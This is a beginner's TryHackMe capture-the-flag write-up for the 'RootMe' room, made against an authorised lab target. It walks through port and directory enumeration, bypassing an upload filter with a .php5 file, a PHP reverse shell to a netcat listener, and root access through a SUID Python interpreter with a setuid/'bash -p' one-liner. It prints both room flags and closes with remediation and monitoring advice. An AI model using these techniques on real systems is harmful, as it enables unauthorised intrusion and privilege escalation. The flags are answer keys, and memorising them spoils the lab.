# TryHackMe — RootMe

**Date:** 10 November 2026  
**Platform:** TryHackMe  
**Room:** RootMe — A CTF for beginners, can you root me?  
**Focus:** Reconnaissance, web directory enumeration, file-upload validation, PHP execution, reverse shells, Linux enumeration, SUID permissions, and privilege escalation  
**Target used in my session:** `10.49.160.3`  
**Attacker machine:** Kali Linux  
**Status:** Completed — user and root flags recovered

> **Lab scope:** All testing documented here was performed against my authorised, temporary TryHackMe RootMe target. The target IP is session-specific and may change when the room is restarted. Do not reuse the commands against systems without explicit permission.

---

## 1. Room objective

The objective of this room was to obtain an initial foothold on a Linux web server, investigate the machine from a low-privileged account, escalate privileges, and retrieve both flags.

I completed the room by following this attack path:

1. Scan the target to identify exposed ports and services.
2. Enumerate the web server's directories with Gobuster.
3. Inspect the upload functionality in the `/panel/` directory.
4. Test how the application validates uploaded file extensions.
5. Confirm that a `.php5` file was executed by the server.
6. Obtain a reverse shell as the web-server account, `www-data`.
7. Enumerate Linux users, permissions, and SUID executables.
8. Identify a root-owned SUID Python 2.7 interpreter.
9. Use the interpreter's effective root privileges to obtain a root shell.
10. Retrieve the user and root flags.

This room connected web application testing with Linux privilege escalation. It also taught me to verify every stage instead of assuming that a successful upload, shell connection, or SUID discovery automatically means full system access.

---

## 2. Lab setup and target information

I started the TryHackMe machine and connected to it from Kali through the TryHackMe VPN.

The target IP in this session was:

```text
10.49.160.3
```

I checked my network interfaces on Kali:

```bash
ip addr
```

The relevant interfaces were:

| Interface | IP address | Purpose |
|---|---|---|
| `eth0` | `10.0.2.15/24` | VirtualBox network |
| `docker0` | `172.17.0.1/16` | Docker bridge |
| `tun0` | `192.168.130.117/18` | TryHackMe VPN |
| `lo` | `127.0.0.1` | Loopback |

The VPN interface was `tun0`. Its address, `192.168.130.117`, was important later because the reverse shell needed to connect back to my Kali machine through the TryHackMe network.

I verified the route to the target:

```bash
ip route get 10.49.160.3
```

The output showed:

```text
10.49.160.3 via 192.168.128.1 dev tun0 src 192.168.130.117
```

This confirmed that traffic to the target was routed through `tun0` and that `192.168.130.117` was the source address Kali would use.

---

## 3. Task 2 — Reconnaissance

### 3.1 Initial Nmap scan

I began with a service/version scan:

```bash
nmap -sCV 10.49.160.3
```

The first scan reported the host as up but showed the default 1,000 TCP ports as closed. I repeated the scan with host discovery disabled:

```bash
nmap -sCV -Pn 10.49.160.3
```

The `-Pn` option tells Nmap to skip its normal host-discovery stage and scan the target as though it is online. This can be useful in lab environments where ping or discovery probes are filtered.

The scan identified two open TCP ports:

| Port | State | Service | Version |
|---:|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | Open | HTTP | Apache httpd 2.4.41 (Ubuntu) |

The HTTP service also returned the title:

```text
HackIT - Home
```

Nmap identified the target as an Ubuntu Linux machine.

### 3.2 Understanding the results

**Port 22 — SSH**

SSH is used for secure remote login and administration. The service was exposed, but I did not have credentials at this stage.

**Port 80 — HTTP**

The web server was running Apache 2.4.41 on Ubuntu. Since HTTP was available and the page title suggested a web application, I focused the next part of the reconnaissance on the website.

### 3.3 A correction to my Nmap command

I also tried:

```bash
nmap -sCV -P- 10.49.160.3
```

Nmap rejected this because `-P-` is not the option for scanning all TCP ports. The correct option is:

```bash
nmap -sCV -p- -Pn 10.49.160.3
```

Here, `-p-` requests a scan of all TCP ports from 1 to 65535. My earlier successful scan covered the default top 1,000 TCP ports; it did not establish that no additional ports existed outside that range.

This was a useful command-line correction: Nmap options are case-sensitive and `-P` options are used for host-discovery probes, while `-p` selects ports.

---

## 4. Web directory enumeration with Gobuster

After identifying Apache on port 80, I used Gobuster to discover directories and files that were not linked from the home page.

Command:

```bash
gobuster dir -u http://10.49.160.3 -w /usr/share/wordlists/dirb/common.txt
```

### 4.1 Command breakdown

| Argument | Explanation |
|---|---|
| `gobuster` | Directory and file enumeration tool |
| `dir` | Use directory/file discovery mode |
| `-u` | Specify the target URL |
| `http://10.49.160.3` | Root URL of the web server |
| `-w` | Specify the wordlist |
| `/usr/share/wordlists/dirb/common.txt` | Common directory and filename candidates |

Gobuster sends HTTP requests for entries in the wordlist and records responses that differ from the server's not-found response.

### 4.2 Results

The scan returned:

| Path | HTTP status | Meaning |
|---|---:|---|
| `.hta` | 403 | Forbidden |
| `.htaccess` | 403 | Forbidden |
| `.htpasswd` | 403 | Forbidden |
| `/css/` | 301 | Redirect |
| `/index.php` | 200 | Successful response |
| `/js/` | 301 | Redirect |
| `/panel/` | 301 | Redirect |
| `/server-status` | 403 | Forbidden |
| `/uploads/` | 301 | Redirect |

The most interesting discoveries were:

```text
/panel/
/uploads/
```

A `301` response indicates a redirect, commonly to the same directory path with a trailing slash. A `403` response means the server understood the request but refused access. A `200` response means the request succeeded.

### 4.3 Inspecting the home page

I used curl to inspect the response headers and HTML:

```bash
curl -i http://10.49.160.3/
```

The response showed:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

The page source contained the title `HackIT - Home` and the text:

```text
root@rootme:~#
Can you root me?
```

The home page did not reveal an obvious login form or direct route to the objective, so I continued by inspecting the discovered directories.

---

## 5. Inspecting the upload panel

### 5.1 Requesting `/panel/`

I inspected the panel with:

```bash
curl -i http://10.49.160.3/panel/
```

The HTML response contained a file-upload form:

```html
<form action="" method="POST" enctype="multipart/form-data">
    <p>Select a file to upload:</p>
    <input type="file" name="fileUpload" class="fileUpload">
    <input type="submit" value="Upload" name="submit">
</form>
```

Important observations:

- The form used the HTTP `POST` method.
- The form used `multipart/form-data`, which is commonly required for file uploads.
- The file input field was named `fileUpload`.
- The submit button was named `submit`.

This gave me the information needed to reproduce the upload request with curl.

### 5.2 Inspecting `/uploads/`

I checked whether the upload directory was accessible:

```bash
curl -i http://10.49.160.3/uploads/
```

The server returned an Apache directory listing:

```text
Index of /uploads
```

Initially, the directory was empty.

Directory listing being enabled meant that uploaded files could be discovered by requesting the directory itself. This was useful during the lab, but exposing directory listings can also disclose files that an application did not intend to make public.

---

## 6. Testing the file-upload behaviour

I wanted to understand which file types the application accepted and whether accepted files were only stored or actually interpreted by the web server.

I started with a harmless text file.

### 6.1 Creating a text test file

On Kali:

```bash
echo "RootMe upload test" > test.txt
```

I submitted it using curl:

```bash
curl -i -X POST \
  -F "fileUpload=@test.txt" \
  -F "submit=Upload" \
  http://10.49.160.3/panel/
```

The response included a success message and a link to:

```text
../uploads/test.txt
```

I checked the upload directory again:

```bash
curl -i http://10.49.160.3/uploads/
```

The listing now included `test.txt`.

This established that the form accepted a normal text file and stored it under the publicly accessible uploads directory.

### 6.2 Testing a `.php` file

Next, I created a harmless PHP execution test:

```bash
echo '<?php echo "PHP execution test"; ?>' > test.php
```

I attempted to upload it:

```bash
curl -i -X POST \
  -F "fileUpload=@test.php" \
  -F "submit=Upload" \
  http://10.49.160.3/panel/
```

The application returned the message:

```text
PHP não é permitido!
```

This Portuguese message means:

```text
PHP is not allowed!
```

The `.php` extension was rejected by the upload application.

### 6.3 Testing an alternative extension

The rejection of `.php` did not yet tell me whether the server would execute PHP files with other extensions. I tested an alternative PHP-associated extension, `.php5`, using the same harmless execution test.

The important distinction was:

- An upload application may reject one exact extension.
- The web server may be configured to interpret more than one extension as PHP.
- Therefore, application-side extension checks and server-side execution configuration both matter.

The `.php5` test file was accepted by the upload form. I then requested the uploaded file from the `/uploads/` directory.

The response body displayed:

```text
PHP execution test
```

It did not display the PHP source code.

### 6.4 Confirming server-side PHP execution

This response was the key evidence.

If the server had served the PHP source as plain text, I would have seen the PHP tags and source code. Instead, I saw the output produced by the PHP statement.

This confirmed that the server was executing the uploaded `.php5` file as PHP.

**Finding:** The application blocked the `.php` extension but accepted `.php5`, and the web server executed the accepted file. This created a path to remote code execution through the upload functionality.

### 6.5 Security lesson

A secure upload feature should not rely only on a blacklist of disallowed extensions.

Defensive controls should include:

- A strict allowlist of permitted file types.
- Server-side validation rather than trusting the browser.
- Content inspection and safe file handling.
- Randomised server-side filenames.
- Storage outside the web root where possible.
- Disabling script execution in upload directories.
- Correct web-server configuration for file handlers.
- Least-privilege permissions for the web-server account.

The important lesson is that upload acceptance and server-side execution are separate behaviours. I tested both.

---

## 7. Obtaining a reverse shell

Once I confirmed that the server executed PHP from the upload directory, I used the lab's intended reverse-shell approach to obtain command execution as the web-server account.

### 7.1 Understanding a reverse shell

A reverse shell is a connection initiated from the target machine back to the attacker's machine.

In this lab:

- Kali was the listener.
- The RootMe machine was the connecting host.
- Kali listened on TCP port `4444`.
- The callback destination was Kali's TryHackMe VPN address, `192.168.130.117`.

A reverse connection is useful when the target can make outbound connections to the attacker but the attacker cannot directly initiate a connection to the target service or shell.

### 7.2 Listener

I started Netcat on Kali:

```bash
nc -lvnp 4444
```

Option breakdown:

| Option | Meaning |
|---|---|
| `-l` | Listen for an incoming connection |
| `-v` | Verbose output |
| `-n` | Do not perform DNS resolution |
| `-p 4444` | Listen on local TCP port 4444 |

The listener displayed:

```text
listening on [any] 4444 ...
```

I kept this terminal open while triggering the uploaded PHP file.

### 7.3 Reverse-shell callback configuration

The callback address needed to be the Kali VPN address:

```text
192.168.130.117
```

The callback port was:

```text
4444
```

I used the PHP reverse-shell script in the authorised lab, configured its callback address and port, uploaded it using the panel, and requested the uploaded file to trigger the connection.

The upload request used the same form field names discovered earlier:

```bash
curl -i -X POST \
  -F "fileUpload=@shell.php5" \
  -F "submit=Upload" \
  http://10.49.160.3/panel/
```

The listener received a connection from the target:

```text
connect to [192.168.130.117] from (UNKNOWN) [10.49.160.3] 52686
```

The source port was ephemeral and could differ between connections.

### 7.4 Confirming the initial account

The reverse shell displayed system information and the account identity:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I ran:

```bash
whoami
```

The result was:

```text
www-data
```

This confirmed that I had obtained command execution as the Apache web-server account, not as root.

### 7.5 Understanding `www-data`

`www-data` is a common low-privilege Linux account used by web services such as Apache.

Web applications often run under a dedicated service account so that a compromise of the web application does not automatically grant full system privileges.

In this case, the account had UID 33 and GID 33.

This was the initial foothold. I still needed to investigate the system for a route to higher privileges.

---

## 8. Understanding the reverse-shell limitations

The reverse shell worked, but it was not a fully interactive terminal.

The output included:

```text
/bin/sh: 0: can't access tty; job control turned off
```

This indicated that the shell did not have a controlling terminal (TTY).

A basic reverse shell can still execute commands, but it may have limitations such as:

- No normal command-line editing.
- No job control.
- Awkward behaviour with interactive programs.
- Terminal control characters appearing in the input.
- Commands that require a TTY failing or behaving differently.

For example, I ran:

```bash
sudo -l
```

The response was:

```text
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

This did not prove that sudo was exploitable or unavailable. It showed that the current shell did not provide the terminal functionality required by that sudo operation.

I learned to distinguish a limitation of the shell environment from a finding about the target's permissions.

---

## 9. Linux enumeration as `www-data`

After obtaining the foothold, I began enumerating the target.

### 9.1 Confirming identity

```bash
whoami
id
```

The output was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `id` command displays the current user's real UID, primary GID, and supplementary groups.

### 9.2 Inspecting the current directory

```bash
pwd
```

The output was:

```text
/
```

The shell was currently at the filesystem root directory.

### 9.3 Listing the filesystem root

```bash
ls -la /
```

The output showed standard Linux directories such as:

```text
/bin
/boot
/dev
/etc
/home
/lib
/opt
/proc
/root
/run
/tmp
/usr
/var
```

The `/root` directory existed, but its permissions were:

```text
drwx------ 7 root root ... /root
```

The `drwx------` permissions mean:

- The owner (`root`) has read, write, and execute permissions.
- The group has no permissions.
- Other users have no permissions.

Since I was `www-data`, I could not enter `/root`.

I tested:

```bash
cd /root
```

The shell returned:

```text
/bin/sh: cd: can't cd to root
```

This was expected because the directory was restricted to root.

### 9.4 Checking home directories

I also used:

```bash
ls -la /home
```

This is useful during Linux enumeration because user home directories may reveal local accounts, files, or misconfigured permissions.

### 9.5 Checking sudo permissions

I attempted:

```bash
sudo -l
```

As noted earlier, the non-interactive shell could not provide the terminal required by sudo. I did not treat this error as evidence of a particular sudo privilege.

---

## 10. Finding SUID executables

One of the most important Linux privilege-escalation checks is identifying SUID executables.

I ran:

```bash
find / -type f -perm -4000 2>/dev/null
```

### 10.1 Understanding the command

| Part | Meaning |
|---|---|
| `find /` | Search from the filesystem root |
| `-type f` | Match regular files |
| `-perm -4000` | Match files with the SUID permission bit set |
| `2>/dev/null` | Suppress permission-denied and other error messages |

The SUID bit is represented by the octal permission value `4000`.

When a binary is owned by a user and has SUID enabled, execution can use the file owner's effective user identity rather than simply the identity of the user who launched it. The exact behaviour also depends on filesystem mount options, process credentials, and program behaviour.

### 10.2 SUID enumeration results

The output included many standard system binaries, but one result stood out:

```text
/usr/bin/python2.7
```

The complete output also included binaries such as:

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/bin/su
/bin/mount
/bin/umount
```

Some SUID binaries are normal parts of a Linux installation. Their presence alone does not prove that they are vulnerable.

Python was particularly interesting because a general-purpose interpreter can execute operating-system commands. A root-owned Python interpreter with SUID enabled can therefore create a serious privilege-escalation risk.

### 10.3 Verifying Python's permissions

I checked the file directly:

```bash
ls -l /usr/bin/python2.7
```

The output was:

```text
-rwsr-xr-x 1 root root 3657904 Dec 9 2024 /usr/bin/python2.7
```

Breaking down the permissions:

| Part | Meaning |
|---|---|
| `-` | Regular file |
| `rwx` | Owner permissions |
| `s` | SUID bit set in the owner's execute position |
| `r-x` | Group can read and execute |
| `r-x` | Other users can read and execute |
| `root root` | File owner and group are root |

The most important part was:

```text
-rwsr-xr-x 1 root root
```

The executable was owned by root and had SUID enabled.

This was the privilege-escalation path I investigated.

---

## 11. Understanding why SUID Python mattered

### 11.1 Real UID and effective UID

Linux processes have multiple user identifiers. Two important ones are:

- **Real UID (RUID):** Identifies the user who started the process.
- **Effective UID (EUID):** Determines the user identity used for many permission checks.

When a user executes a root-owned SUID binary, the process can retain the caller's real UID while receiving the file owner's identity as its effective UID.

In this case, I was `www-data`, UID 33. The Python executable was owned by root and had SUID enabled.

### 11.2 Verifying the interpreter's identity

I ran the following command from the target's reverse shell:

```bash
/usr/bin/python2.7 -c 'import os; print(os.getuid()); print(os.geteuid())'
```

The output was:

```text
33
0
```

The same values were later displayed together as:

```text
(33, 0)
```

This meant:

| Function | Result | Meaning |
|---|---:|---|
| `os.getuid()` | 33 | Real UID: `www-data` |
| `os.geteuid()` | 0 | Effective UID: `root` |

This was the decisive confirmation that the SUID Python interpreter was running with effective root privileges.

### 11.3 A troubleshooting mistake I made

At one point, I ran the UID-checking command in my normal Kali terminal:

```bash
/usr/bin/python2.7 -c 'import os; print(os.getuid()); print(os.geteuid())'
```

It returned:

```text
1000
1000
```

That result described my local Kali user, not the RootMe target.

I had to run the command inside the Netcat reverse shell to inspect the target process. The target returned `33` and `0`.

This was a useful lesson: when working with a remote shell, I must always distinguish between commands running on my attacking machine and commands running on the target.

### 11.4 Another shell mistake I made

I initially typed Python statements such as:

```python
import os
print(os.getuid())
```

directly at the Linux `/bin/sh` prompt. The shell responded with errors because `import` and Python's `print()` syntax are not shell commands.

I corrected this by passing the Python code to the interpreter with the `-c` option:

```bash
/usr/bin/python2.7 -c 'import os; print(os.getuid(), os.geteuid())'
```

This avoided needing an interactive Python prompt in the limited reverse shell.

---

## 12. Escalating from effective root to a root shell

The UID check proved that Python had an effective UID of 0, but that did not automatically mean that every shell launched from Python would preserve those privileges.

### 12.1 Why the first shell attempt was insufficient

I first tried to replace the Python process with `/bin/sh`:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh")'
```

After that, `whoami` still reported:

```text
www-data
```

The important lesson was that a shell may drop elevated privileges when it is launched in a way that does not preserve them.

Having a process with effective UID 0 and obtaining a usable root shell are related, but they are not identical outcomes.

### 12.2 The successful privilege transition

I then used the Python process's effective root privileges to set its real UID to 0 before replacing it with Bash in privileged mode:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```

What each part did:

| Code | Explanation |
|---|---|
| `import os` | Loads Python's operating-system interface |
| `os.setuid(0)` | Sets the process UID to 0; the SUID process had the privilege required to do this |
| `os.execl(...)` | Replaces the current process with the requested executable |
| `/bin/bash` | Starts Bash |
| `"bash"` | Sets the process argument name |
| `"-p"` | Requests Bash privileged mode so it does not automatically discard the elevated privileges |

The first time I ran this, I saw some stray terminal input such as `shell` and a mistyped `whomai`. Those were input/terminal mistakes, not evidence that the privilege escalation had failed.

I corrected the input and ran:

```bash
whoami
```

The output was:

```text
root
```

This confirmed that I had obtained a root shell.

### 12.3 Verifying the result

I also listed the filesystem again:

```bash
ls
```

The output showed the standard top-level directories, including `/root`.

At this point, the privilege-escalation objective was complete.

---

## 13. Flag collection

With root access, I searched for the two flag files.

### 13.1 Finding the user flag

I ran:

```bash
find / -name user.txt 2>/dev/null
```

The result was:

```text
/var/www/user.txt
```

I read it:

```bash
cat /var/www/user.txt
```

**User flag recovered:**

```text
THM{y0u_g0t_a_sh3ll}
```

### 13.2 Finding the root flag

I searched for the root flag:

```bash
find / -name root.txt 2>/dev/null
```

The result was:

```text
/root/root.txt
```

I read it:

```bash
cat /root/root.txt
```

**Root flag recovered:**

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

### 13.3 Completion status

| Objective | Result |
|---|---|
| Identify open ports | Completed |
| Identify Apache version | Completed |
| Identify SSH service | Completed |
| Discover hidden web directories | Completed |
| Find upload panel | Completed |
| Test file-upload restrictions | Completed |
| Confirm `.php5` execution | Completed |
| Obtain reverse shell | Completed |
| Identify initial user | `www-data` |
| Find SUID Python | Completed |
| Confirm effective UID 0 | Completed |
| Obtain root shell | Completed |
| Recover user flag | Completed |
| Recover root flag | Completed |

---

## 14. Complete attack chain

The room's attack path can be summarised as follows:

```text
Kali Linux
    |
    | Nmap reconnaissance
    v
Target: 10.49.160.3
    |
    | TCP 22: SSH
    | TCP 80: Apache HTTP
    v
Gobuster directory enumeration
    |
    | /panel/
    | /uploads/
    v
File-upload functionality
    |
    | .php rejected
    | .php5 accepted
    v
PHP code execution
    |
    | Reverse connection to Kali tun0
    | 192.168.130.117:4444
    v
Initial shell: www-data (UID 33)
    |
    | Linux enumeration
    | SUID file discovery
    v
Root-owned SUID Python 2.7
    |
    | Real UID: 33
    | Effective UID: 0
    v
Bash privileged mode
    |
    v
Root shell
    |
    +--> /var/www/user.txt
    |
    +--> /root/root.txt
```

The key transition was:

```text
www-data (UID 33)
       |
       | Root-owned SUID Python
       v
Python: RUID 33, EUID 0
       |
       | setuid(0) and privileged Bash
       v
root
```

---

## 15. Key concepts I learned

| Concept | What I learned |
|---|---|
| Nmap | How to discover open ports, identify services, and detect versions |
| `-Pn` | How to skip host discovery when a target may filter discovery probes |
| `-p-` | How to request a scan of all TCP ports |
| Gobuster | How to discover web directories and files using a wordlist |
| HTTP status codes | How to interpret 200, 301, and 403 responses during enumeration |
| HTTP POST | How multipart form submissions are used for file uploads |
| File-upload validation | Why extension blacklists can be insufficient |
| PHP execution | How to distinguish interpreted server-side code from source served as text |
| Reverse shell | How a target can initiate a command connection back to an attacker-controlled listener |
| Netcat | How to listen for an incoming TCP connection |
| `www-data` | Why web services commonly run under a restricted service account |
| Linux permissions | How owner, group, and other permission bits affect access |
| SUID | How an executable can run with its file owner's effective identity |
| Real UID | The identity of the user who started a process |
| Effective UID | The identity used for many permission checks |
| Python `os` module | How to inspect and interact with process identity |
| Bash privileged mode | Why shell privilege handling matters after an elevated process starts a shell |

---

## 16. Mistakes, troubleshooting, and what I would do differently

This room included several small mistakes that helped me understand the tools more deeply.

### 16.1 Confusing `-P-` and `-p-` in Nmap

I initially used:

```bash
nmap -sCV -P- 10.49.160.3
```

Nmap rejected it. The correct all-port option is lowercase `-p-`:

```bash
nmap -sCV -p- -Pn 10.49.160.3
```

**Lesson:** Check option syntax carefully. Uppercase and lowercase Nmap options can have completely different meanings.

### 16.2 Running Python code in the shell

I entered Python statements directly into `/bin/sh`, which produced errors such as:

```text
import: not found
```

I corrected this by using Python's `-c` option:

```bash
/usr/bin/python2.7 -c 'import os; print(os.getuid(), os.geteuid())'
```

**Lesson:** Know which interpreter or shell is currently accepting input.

### 16.3 Running a target command on Kali

I ran the UID-checking command on Kali and received:

```text
1000
1000
```

Those were Kali's local user IDs. The target's values were:

```text
33
0
```

**Lesson:** Always verify which machine a command is running on. A local terminal and a remote reverse shell can look similar.

### 16.4 Misunderstanding the first shell after Python

The first attempt to launch `/bin/sh` did not give me a root shell. `whoami` still showed `www-data`.

The reason was privilege handling by the shell. I needed to understand the distinction between Python's effective UID and the credentials retained by the new shell.

**Lesson:** Verify privileges after every process transition. Do not assume that an elevated parent process automatically produces an elevated child shell.

### 16.5 Working with a non-interactive reverse shell

The reverse shell did not have a TTY, which caused problems with commands that expected terminal interaction.

**Lesson:** A shell can be sufficient for basic enumeration but still have limitations. When a command fails, determine whether the issue is the command, permissions, or the shell environment.

---

## 17. Defensive lessons and remediation

Although this was an offensive lab, each step has a defensive lesson.

### 17.1 Secure file uploads

The web application rejected `.php` but accepted `.php5`, which the server executed.

Defensive recommendations:

- Use a strict allowlist of permitted file types.
- Do not rely only on extension blacklists.
- Validate uploaded content on the server.
- Generate safe server-side filenames.
- Store uploaded files outside the web root where possible.
- Disable script execution in upload directories.
- Apply least-privilege permissions to the web-server account.
- Log upload attempts, rejected extensions, and unusual requests.

### 17.2 Restrict web-server privileges

The initial shell ran as `www-data`. Running a web application as a dedicated, unprivileged account limits the impact of a web compromise.

However, the SUID Python binary created a path from that low-privilege account to root.

Defensive recommendations:

- Audit SUID and SGID binaries regularly.
- Remove SUID from interpreters and utilities that do not require it.
- Investigate unexpected permission changes.
- Monitor changes to privileged executables.
- Keep operating-system packages patched.
- Use filesystem mount options such as `nosuid` where appropriate and compatible with the system's requirements.

### 17.3 Monitor for suspicious activity

A SOC analyst investigating a similar compromise could look for:

- Unusual POST requests to file-upload endpoints.
- Upload attempts involving script extensions.
- Requests to newly uploaded files in public directories.
- Unexpected outbound connections from a web server.
- Web-server processes spawning shells or interpreters.
- Execution of Python or other interpreters from a web-service account.
- Unusual access to sensitive paths such as `/root`.
- Execution of binaries with SUID permissions.

Potential telemetry sources include:

- Apache access and error logs.
- Linux authentication logs.
- Process execution telemetry.
- EDR process trees.
- Network connection logs.
- File integrity monitoring.
- Auditd events, where configured.

A useful investigation chain would connect the upload request, the uploaded filename, the web-server process, the outbound connection, and subsequent process execution.

---

## 18. Final reflection

Completing RootMe helped me understand how a web application vulnerability can become a full Linux system compromise when combined with weak privilege configuration.

The first part of the room was about reconnaissance. Nmap identified SSH and Apache, while Gobuster revealed the upload panel and public upload directory.

The most important web finding was that the application rejected `.php` but accepted `.php5`. Testing the uploaded file showed that the server executed its PHP code. This was stronger evidence than simply seeing an upload-success message: it confirmed that the file was interpreted by the server.

The reverse shell gave me my first foothold as `www-data`. From there, I enumerated the filesystem and searched for SUID binaries. The root-owned SUID Python 2.7 executable was the key privilege-escalation finding.

The UID checks were especially useful. Seeing a real UID of 33 and an effective UID of 0 explained why Python had root-level permissions even though I had started as `www-data`. I also learned that launching a shell is a separate privilege-handling step and that I must verify the resulting identity rather than assume it.

Finally, I recovered both flags and confirmed root access.

**My main takeaway:** Initial access is only one stage of a penetration test. After obtaining a foothold, careful enumeration and an understanding of Linux process credentials can reveal paths to privilege escalation. The same attack chain also gives defenders concrete behaviours to monitor, from suspicious uploads to unexpected shell execution and abuse of SUID binaries.

---

## 19. Quick revision notes

- **Open ports found:** 22/tcp (SSH) and 80/tcp (HTTP).
- **Web server:** Apache 2.4.41 on Ubuntu.
- **Interesting directories:** `/panel/` and `/uploads/`.
- **Upload finding:** `.php` was rejected; `.php5` was accepted and executed.
- **Initial access:** Reverse shell as `www-data`.
- **Initial UID:** 33.
- **Privilege-escalation finding:** `/usr/bin/python2.7` was owned by root and had SUID enabled.
- **Python identity:** Real UID 33, effective UID 0.
- **Final identity:** `root`.
- **User flag path:** `/var/www/user.txt`.
- **Root flag path:** `/root/root.txt`.

### Flags

**User flag**

```text
THM{y0u_g0t_a_sh3ll}
```

**Root flag**

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

*This write-up records my own TryHackMe lab observations from 10 November 2026. The target IP, service versions, file locations, and outputs are specific to my session and may differ in a future deployment of the room.*
